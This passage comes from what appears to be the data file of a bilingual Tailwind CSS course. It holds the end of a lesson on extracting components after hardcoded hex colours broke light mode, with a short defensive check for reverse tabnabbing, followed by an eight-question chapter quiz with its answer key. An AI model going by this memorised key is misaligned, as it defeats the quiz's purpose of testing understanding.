<p>Không cái nào đúng phổ quát. Tín hiệu để HỢP NHẤT là khi nguyên thể của hai vùng đã <em>HỘI TỤ</em> — nếu cái nút của finance và của settings rốt cuộc GIỐNG HỆT nhau, thì sự trùng lặp thôi mua được sự độc lập và nên được gộp lại.</p>

<div class="pitfall">
<p><strong>Bẫy — tách các component ra rồi ĐỂ NGUYÊN các giá trị đóng cứng.</strong> Cú tách trong file này CHỈ là một cú vá vì các giá trị ĐỒNG THỜI trở thành biến CSS. Dời <code>#0a0a14</code> từ mọi chỗ gọi vào một component thì làm nó DỄ VÁ HƠN về sau, nhưng màn Cài đặt VẪN đen trong theme sáng cho tới khi có người làm việc ấy. Tách và cú SỬA thật là HAI bước, và giao mỗi bước đầu thì có CẢM GIÁC tiến bộ trong khi không đổi được thứ gì người dùng nhìn thấy.</p>
</div>

<div class="callout">
<p><strong>Một câu.</strong> Lý do MẠNH nhất để tách không phải sự trùng lặp mà là <em>SỰ TRÙNG LẶP CỦA CÁI SAI</em> — các nguyên thể settings của kho này tồn tại vì các mã hex đóng cứng làm màn hình không dùng được ở theme sáng — và phần đầu file xứng đáng chỗ đứng của nó bằng cách GHI LẠI con bọ, cơ chế đã thay thế nó, và luật của kho mà nó cố ý tôn trọng.</p>
</div>

<h3>🔬 Đo thật: phần đầu tệp vẫn đúng</h3>
<div class="out">$ for f in settings finance language; do printf "%-9s export %2s · dark: that su %s\\n" $f $(grep -c '^export' src/components/$f/primitives.tsx) $(grep -n 'dark:' src/components/$f/primitives.tsx | grep -vcE '^[0-9]+:\\s*(\\*|//|/\\*)'); done
settings  export 12 · dark: that su 0
finance   export 11 · dark: that su 0
language  export 13 · dark: that su 0
$ git log --diff-filter=A --format='%h %ad' --date=short -- src/components/settings/primitives.tsx
da160fbb4 2026-08-08</div>
<p>Đếm riêng dòng mã (bỏ chú thích), cả ba tệp primitives dùng <strong>không</strong> lớp <code>dark:</code> nào — lời hứa ở phần đầu tệp vẫn giữ sau ba tháng.</p>
<h3>🔬 Đo thật: con bọ, lấy từ lịch sử git và chạy lại trong Chromium</h3>
<div class="out">$ git show da160fbb4^:frontend/src/app/settings/notifications/page.tsx | grep -nE "0a0a14|rgba\\(15, ?23, ?42" | cut -c1-110
166:        background: 'rgba(15,23,42,0.6)',
298:    &lt;div className="min-h-screen w-full relative" style={{ background: '#0a0a14' }}&gt;
330:            background: 'rgba(15,23,42,0.6)',</div>
<p>Trang thông báo ngay trước cú tách viết cứng nền cả trang và hai khung. Chạy lại bằng giá trị theme thật của trang (<code>--text-primary</code> #050505 ở chế độ sáng, #e4e6eb ở chế độ tối):</p>
<table><tr><th>thẻ</th><th>theme</th><th>nền</th><th>tương phản</th></tr>
<tr><td>viết cứng <code>#0a0a14</code></td><td>sáng</td><td><code>rgb(10, 10, 20)</code></td><td><strong>1,04</strong></td></tr>
<tr><td><code>var(--bg-card)</code></td><td>sáng</td><td><code>rgb(255, 255, 255)</code></td><td>20,38</td></tr>
<tr><td>viết cứng</td><td>tối</td><td><code>rgb(10, 10, 20)</code></td><td>15,77</td></tr>
<tr><td><code>var(--bg-card)</code></td><td>tối</td><td><code>rgb(36, 37, 38)</code></td><td>12,30</td></tr></table>
<p>Chữ đi theo theme; nền viết cứng thì không — gần đen trên gần đen, <strong>1,04:1</strong> so với mức tối thiểu 4,5 của WCAG. Ở chế độ tối cả hai thẻ đều đọc được, nên lúc viết không ai thấy lỗi.</p>
<h3>🔬 Đo thật: mẫu ấy đã hết chưa?</h3>
<div class="out">$ git grep -l 'bg-\\[#0a0a14\\]' -- 'src/*.tsx'
src/app/games/[slug]/GamePlayClient.tsx
src/components/messaging/BlockedUsersModal.tsx
src/components/messaging/MessageList.tsx
src/components/messaging/NicknamePopover.tsx
src/components/messaging/ThreadRowMenu.tsx
$ grep -n '0a0a14' src/app/globals.css
419:  .bg-\\[\\#0a0a14\\],</div>
<p>Năm tệp vẫn sơn <code>bg-[#0a0a14]</code> — các ô bật lên của tin nhắn và khung trò chơi, là đảo tối có chủ ý. <code>globals.css</code> dòng 419 liệt kê lớp ấy trong các bề mặt tối được khai lại biến chữ về giá trị tối, nên chữ bên trong vẫn đọc được ở chế độ sáng (bài 9.2 đo lưới chắn này).</p>
<h3>🔬 Đo thật: các Button theo tính năng đang hội tụ</h3>
<div class="out">$ node hai.cjs
finance 12 lop · settings 12 lop · chung 10
chi finance : gap-1.5 transition-colors
chi settings: gap-2 transition-all</div>
<p>Button của finance và settings chung 10 trên 12 lớp nền; hai chỗ khác trông như trôi chứ không phải cố ý. Hội tụ là tín hiệu để gộp.</p>
<h3>🌍 Ngoài đời, "nếu… thì sao", và góc kẻ xấu</h3>
<ul><li><strong>Ngoài đời:</strong> một lỗi chính tả trong mẫu đơn in sẵn bị chép lên mọi tờ photo từ nó. Sửa mẫu là sửa mọi bản sau; sửa một tờ chỉ được một tờ.</li>
<li><strong>Nếu… thì sao:</strong> không ai tách? Mỗi khung viết cứng cần sửa riêng, mỗi lần là một cơ hội bỏ sót — và người dùng chế độ sáng sẽ tìm ra chỗ sót giùm bạn.</li>
<li><strong>Góc kẻ xấu — một bản vá bảo mật chép tay:</strong> <code>target="_blank"</code> thiếu <code>rel="noopener"</code> từng cho trang được mở viết đè tab của bạn (reverse tabnabbing, một mánh lừa đảo). Ở đây:</li></ul>
<div class="out">$ git grep -c 'target="_blank"' -- 'src/*.tsx' | awk -F: '{s+=$2} END {print s " lan target=_blank trong " NR " tep"}'
232 lan target=_blank trong 145 tep
$ git grep -hoE '&lt;a [^&gt;]*target="_blank"[^&gt;]*&gt;' -- 'src/*.tsx' | awk '{n++} /rel=/{r++} END {print n " the &lt;a&gt; viet mot dong · " r " co rel= · " n-r " thieu"}'
138 the &lt;a&gt; viet mot dong · 137 co rel= · 1 thieu
$ git grep -nE '&lt;a [^&gt;]*target="_blank"[^&gt;]*&gt;' -- 'src/*.tsx' | grep -v 'rel=' | cut -c1-96
src/components/messaging/AnhLightbox.tsx:6: * Trước đây bấm ảnh trong tin nhắn là &#96;&lt;a target="_b</div>
<p>137 trên 138 liên kết viết một dòng có <code>rel=</code>; cái "thiếu" là một dòng chú thích. Dù vậy 232 bản viết tay là 232 lần có thể quên — một component <code>&lt;ExternalLink&gt;</code> biến nó thành một chỗ.</p>
<h3>🔁 Tự chạy lại</h3>
<pre><code class="language-bash"><span class="tok-comment"># 1) màu viết cứng trong dự án của bạn</span>
git grep -nE "bg-\\[#[0-9a-fA-F]{6}\\]|background: '#[0-9a-fA-F]{6}'" -- '*.tsx' | head
<span class="tok-comment"># 2) trang trước một cú tách, lấy từ lịch sử git</span>
git show &lt;commit&gt;^:path/to/page.tsx | grep -n '#'
<span class="tok-comment"># 3) màu chữ và nền của một phần tử (console DevTools)</span>
getComputedStyle($0).color + ' on ' + getComputedStyle($0).backgroundColor</code></pre>
<h3>🔗 Học sâu hơn</h3>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-2-4-che-do-toi" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 2.4 — Chế độ tối, và cái tên lớp làm vỡ một tính năng</span><span class="lc-sub">Vì sao lớp toàn cục là theme-dark, không bao giờ là dark</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-7-3-cau-truc" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 7.3 — Cấu trúc dự án: thư mục theo tính năng</span><span class="lc-sub">Primitives theo tính năng, nhìn từ phía React</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-5-1-extend" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 5.1 — extend THÊM VÀO; theme THAY THẾ</span><span class="lc-sub">Chương sau: cấu hình và theme</span></span></a>

<h3>🗂 Thuật ngữ trong bài</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Extraction (cú tách)</span><span class="v">Kéo một mẫu lặp lại thành một component có tên — ở đây là một cú tách THẬT đã xảy ra trong kho.</span></div>
  <div class="kv"><span class="k">Duplicated wrongness (trùng lặp của cái sai)</span><span class="v">Lý do mạnh nhất để tách: không phải trùng lặp một mình mà cùng một cái sai chép ra nhiều chỗ.</span></div>
  <div class="kv"><span class="k">Hardcoded hex (mã hex đóng cứng)</span><span class="v">Giá trị màu cố định làm màn hình không dùng được ở theme sáng — con bọ ép ra cú tách.</span></div>
  <div class="kv"><span class="k">theme-dark rule (luật theme-dark)</span><span class="v">Ràng buộc CLAUDE.md (không bao giờ <code>.dark</code> trên <code>&lt;html&gt;</code>) mà các nguyên thể tách ra cố ý tôn trọng.</span></div>
  <div class="kv"><span class="k">File-header rationale (lý lẽ đầu file)</span><span class="v">Ghi lại con bọ, cơ chế thay thế nó và luật của kho ở đầu file.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul><li>Lý do mạnh nhất để tách là sự trùng lặp của cái SAI, không phải trùng lặp đơn thuần.</li><li>Các nguyên thể settings của kho này tồn tại vì các mã hex đóng cứng làm vỡ theme sáng.</li><li>Cú tách thay các mã hex bằng biến nhận-biết-theme và tôn trọng luật <code>theme-dark</code>.</li><li>Phần đầu file xứng đáng chỗ đứng nhờ ghi lại con bọ, cơ chế, và ràng buộc.</li></ul>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">CLAUDE.md — luật theme-dark</span><span class="lc-sub">ràng buộc của kho mà file này viện dẫn, từ sự cố 02/07/2026 nơi <code>.dark</code> trên <code>&lt;html&gt;</code> làm vỡ bộ chuyển theme của Notes.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">MDN — CSS custom properties</span><span class="lc-sub">developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties — cơ chế cho phép MỘT lớp đúng ở cả hai theme. Chương 6 khai triển đầy đủ.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Kent C. Dodds — Colocation</span><span class="lc-sub">kentcdodds.com/blog/colocation — lập luận cho thư mục theo-tính-năng thay vì thư mục dùng-chung toàn cục, chính là lựa chọn mà ba file này đại diện.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Chương 6 — giá trị biết-theme mà không cần đường mã thứ hai</span><span class="lc-sub">/courses/tailwind-css/learn${REF} — kỹ thuật biến-CSS mà file này dùng, gồm cả cách cắm nó vào config Tailwind để tên lớp vẫn sạch.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 4.6 ─────────────────────────── */
    {
      title: '4.6 — Chapter 4 quiz|||4.6 — Kiểm tra Chương 4',
      slug: 'tw-4-6-quiz',
      type: 'QUIZ',
      description: 'Tám câu, mười hai phút. Về tái sử dụng: 3,1% canh lớp đo được, @apply chép chứ không tham chiếu, prop className là hợp đồng, và khi nào KHÔNG cần cva.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Quiz</span>
<h2>What Chapter 4 measured</h2>
<p class="lead">Eight questions, twelve minutes. This chapter is about judgement calls, so several questions have a defensible-looking wrong answer. The measured number is usually what separates them.</p>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">4.1 — the distribution</span><span class="lz-lnote">82% of class attributes under 80 chars, 3.1% over 160, longest 796. Extract on REPETITION, not length</span></div>
<div class="lz-layer"><span class="lz-lname">4.2 — @apply copies</span><span class="lz-lnote"><code>.btn-lg</code> duplicates 7 of <code>.btn</code>'s 9 declarations. It reverses the dedup that justified utility CSS. This repo: 0 uses in 24,610 lines of CSS</span></div>
<div class="lz-layer"><span class="lz-lname">4.3 — the contract</span><span class="lz-lnote">merge last, spread props, forward ref, document which element. Or do not offer <code>className</code> at all</span></div>
<div class="lz-layer"><span class="lz-lname">4.4 — variants</span><span class="lz-lnote">if-chains are fine for independent axes; the signal for <code>cva</code> is the first COMPOUND case. This repo: 0 uses, 0 <code>variant ===</code> — and lookup tables in 147 files</span></div>
<div class="lz-layer"><span class="lz-lname">4.5 — a real extraction</span><span class="lz-lnote">triggered by duplicated WRONGNESS (hardcoded hex, black in light mode), not duplication. The header records bug, mechanism and constraint</span></div>
</div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 4 · Kiểm tra</span>
<h2>Chương 4 đã đo được gì</h2>
<p class="lead">Tám câu, mười hai phút. Chương này nói về các quyết định PHÁN ĐOÁN, nên vài câu có một đáp án sai TRÔNG rất biện hộ được. Con số ĐO ĐƯỢC thường là thứ tách chúng ra.</p>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">4.1 — phân bố</span><span class="lz-lnote">82% thuộc tính lớp dưới 80 ký tự, 3,1% trên 160, dài nhất 796. Tách theo SỰ LẶP LẠI, không theo độ dài</span></div>
<div class="lz-layer"><span class="lz-lname">4.2 — @apply CHÉP</span><span class="lz-lnote"><code>.btn-lg</code> trùng lặp 7 trên 9 khai báo của <code>.btn</code>. Nó đảo ngược cái khử-trùng-lặp vốn biện minh cho CSS tiện ích. Kho này: 0 lượt trong 24.610 dòng CSS</span></div>
<div class="lz-layer"><span class="lz-lname">4.3 — hợp đồng</span><span class="lz-lnote">hợp nhất cuối, trải props, chuyển tiếp ref, ghi tài liệu thẻ nào. Hoặc ĐỪNG cung cấp <code>className</code> chút nào</span></div>
<div class="lz-layer"><span class="lz-lname">4.4 — biến thể</span><span class="lz-lnote">chuỗi if ổn cho các trục độc lập; tín hiệu cho <code>cva</code> là ca GHÉP đầu tiên. Kho này: 0 lượt, 0 <code>variant ===</code> — và bảng tra trong 147 tệp</span></div>
<div class="lz-layer"><span class="lz-lname">4.5 — một cú tách thật</span><span class="lz-lnote">kích hoạt bởi SỰ TRÙNG LẶP CỦA CÁI SAI (hex đóng cứng, đen trong theme sáng), không phải trùng lặp. Phần đầu file ghi lại bọ, cơ chế và ràng buộc</span></div>
</div>
</div>
`,
      quiz: {
        timeLimitSeconds: 720,
        questions: [
          {
            question: 'Measured across 49,378 class attributes: 82% are under 80 characters and 3.1% exceed 160. What follows?|||Đo trên 49.378 thuộc tính lớp: 82% dưới 80 ký tự và 3,1% vượt 160. Suy ra điều gì?',
            options: [
              'Both sides of the "class soup" argument describe real data — and the long 3.1% are a SIGNAL pointing at missing components, not evidence the approach fails|||Cả hai phe trong cuộc tranh luận "canh lớp" đều mô tả dữ liệu THẬT — và 3,1% dài là một TÍN HIỆU chỉ vào các component còn thiếu, không phải bằng chứng cách làm này thất bại',
              'The codebase needs a lint rule capping class attribute length|||Kho mã cần một luật lint chặn độ dài thuộc tính lớp',
              'The 3.1% should be rewritten with @apply|||3,1% ấy nên được viết lại bằng @apply',
              'The complaint is unfounded since most attributes are short|||Lời phàn nàn vô căn cứ vì phần lớn thuộc tính đều ngắn',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'When should a long class list be extracted into a component?|||Khi nào một danh sách lớp dài nên được tách thành một component?',
            options: [
              'When it is long AND repeated 4+ times — repetition is what costs you, since a design change must then be kept in sync by hand across every copy|||Khi nó DÀI VÀ lặp lại 4+ lần — SỰ LẶP LẠI mới là cái làm bạn tốn kém, vì một thay đổi thiết kế phải được giữ đồng bộ bằng tay ở mọi bản sao',
              'Whenever it exceeds 160 characters|||Bất cứ khi nào nó vượt 160 ký tự',
              'Whenever it contains a responsive variant|||Bất cứ khi nào nó chứa một biến thể responsive',
              'Never — long class lists are the intended style|||Không bao giờ — danh sách lớp dài là phong cách được thiết kế sẵn',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'Building <code>.btn-lg { @apply btn px-8 }</code>, the output duplicates 7 of <code>.btn</code>\'s 9 declarations. Why does that matter?|||Dựng <code>.btn-lg { @apply btn px-8 }</code>, đầu ra trùng lặp 7 trên 9 khai báo của <code>.btn</code>. Vì sao chuyện đó quan trọng?',
            options: [
              'It reverses the deduplication that was the whole economic case for utility CSS — stylesheet size goes back to tracking the number of component classes, like hand-written CSS|||Nó ĐẢO NGƯỢC khả năng khử trùng lặp vốn là toàn bộ luận điểm kinh tế của CSS tiện ích — kích thước bảng kiểu quay lại bám theo SỐ lớp component, y như CSS viết tay',
              'It causes a build warning that must be suppressed|||Nó gây một cảnh báo lúc dựng phải tắt đi',
              'It breaks specificity, since both rules score the same|||Nó phá độ đặc hiệu, vì cả hai quy tắc cùng điểm',
              'It does not matter; gzip removes the duplication|||Không quan trọng; gzip loại bỏ sự trùng lặp',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'Besides duplication, what else does <code>@apply</code> cost you in a React codebase?|||Ngoài trùng lặp, <code>@apply</code> còn làm bạn mất gì trong một kho mã React?',
            options: [
              'tailwind-merge knows nothing about <code>.btn</code>, so <code>cn("btn", "px-8")</code> cannot resolve the conflict — Chapter 3\'s entire solution stops working for your custom classes|||tailwind-merge không biết gì về <code>.btn</code>, nên <code>cn("btn", "px-8")</code> KHÔNG phân giải được xung đột — toàn bộ lời giải của Chương 3 ngừng chạy với các lớp tuỳ biến của bạn',
              'It disables dark mode variants|||Nó tắt các biến thể chế độ tối',
              'It prevents the content scanner from finding your files|||Nó ngăn bộ quét content tìm thấy file của bạn',
              'It requires ejecting from the PostCSS pipeline|||Nó đòi phải thoát khỏi đường ống PostCSS',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'What are the four mechanical requirements once a component accepts <code>className</code>?|||Bốn yêu cầu MÁY MÓC khi một component đã nhận <code>className</code> là gì?',
            options: [
              'Merge it LAST via cn(), spread the remaining props, forward the ref if it wraps a DOM element, and document which element it lands on|||Hợp nhất nó CUỐI qua cn(), trải các prop còn lại, chuyển tiếp ref nếu nó bọc một thẻ DOM, và ghi tài liệu nó rơi lên thẻ nào',
              'Type it as string, default it to empty, validate it, and memoize it|||Khai kiểu string, mặc định rỗng, kiểm tra hợp lệ, và ghi nhớ nó',
              'Put it first so the component can override unsafe values|||Đặt nó ĐẦU để component đè được các giá trị không an toàn',
              'Split it into layout and appearance props and reject the rest|||Chẻ nó thành prop bố cục và prop diện mạo rồi từ chối phần còn lại',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'Why is "no <code>className</code> prop at all" sometimes the RIGHT choice?|||Vì sao "KHÔNG có prop <code>className</code>" đôi khi là lựa chọn ĐÚNG?',
            options: [
              'It is what makes a design system actually constrain anything — an open className prop is the path of least resistance, and ends with eleven visually distinct buttons all rendered by &lt;Button&gt;|||Nó là thứ khiến một hệ thiết kế THẬT SỰ ràng buộc được gì đó — một prop className mở là con đường ít kháng cự nhất, và kết thúc bằng mười một cái nút khác nhau về thị giác đều dựng bởi &lt;Button&gt;',
              'It improves runtime performance measurably|||Nó cải thiện hiệu năng lúc chạy một cách đo được',
              'TypeScript cannot type optional string props safely|||TypeScript không khai kiểu an toàn được cho prop string tuỳ chọn',
              'It is required for server components|||Nó là bắt buộc với server component',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'This repo uses <code>cva</code> zero times across 1,678 component files. What is the right reading?|||Kho này dùng <code>cva</code> không lần nào trên 1.678 tệp component. Cách đọc đúng là gì?',
            options: [
              'Most components are single-axis or no-axis, so an if-chain expresses them fine — the signal to adopt cva is the first COMPOUND case (a rule depending on two axes at once), not the number of variants|||Phần lớn component là một-trục hoặc không-trục, nên một chuỗi if diễn đạt chúng ổn — tín hiệu để nhận cva là ca GHÉP đầu tiên (một quy tắc phụ thuộc hai trục cùng lúc), không phải SỐ biến thể',
              'The team was unaware of cva and should migrate every one of them|||Đội ngũ không biết tới cva và nên di trú tất cả',
              'cva is incompatible with tailwind-merge|||cva không tương thích với tailwind-merge',
              'cva only works in libraries, not applications|||cva chỉ chạy trong thư viện, không chạy trong ứng dụng',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'The settings primitives.tsx was extracted on 2026-08-08. What actually triggered it?|||File settings primitives.tsx được tách ngày 08/08/2026. Cái gì THẬT SỰ kích hoạt nó?',
            options: [
              'Duplicated WRONGNESS — hardcoded hex values like #0a0a14 meant the settings screen stayed pitch black in light mode, and being duplicated meant it was wrong in many places with no single place to fix|||SỰ TRÙNG LẶP CỦA CÁI SAI — các mã hex đóng cứng như #0a0a14 khiến màn Cài đặt ĐEN KỊT trong theme sáng, và bị trùng lặp nghĩa là nó sai ở nhiều chỗ mà không có MỘT chỗ nào để vá',
              'The class attributes had grown past 160 characters|||Các thuộc tính lớp đã dài quá 160 ký tự',
              'A new design system mandated shared components|||Một hệ thiết kế mới yêu cầu component dùng chung',
              'The team was migrating away from Tailwind|||Đội ngũ đang di trú khỏi Tailwind',
            ],
            correctIndex: 0,
            points: 1,
          },
        ],
      },
    },

  ],
};
